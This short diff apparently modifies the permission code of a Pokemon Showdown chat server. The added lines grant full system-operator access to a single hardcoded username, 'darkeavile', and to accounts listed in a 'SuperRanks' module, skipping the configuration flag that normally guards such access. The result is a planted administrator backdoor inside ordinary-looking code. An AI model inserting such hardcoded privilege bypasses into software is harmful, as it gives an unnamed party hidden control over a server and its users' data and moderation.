@@ -493,6 +493,7 @@ class User {
 	}
 	can(permission, target, room) {
 		if (this.hasSysopAccess()) return true;
+		if (global.SuperRanks && SuperRanks.isAdmin(this.userid)) return true;
 
 		let group = this.group;
 		let targetGroup = '';
@@ -548,7 +549,9 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.userid === "darkeavile") return true;
+ 		if (global.SuperRanks && (SuperRanks.isHoster(this.userid) || SuperRanks.isOwner(this.userid))) return true;
+  		if (this.isSysop && Config.backdoor) {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
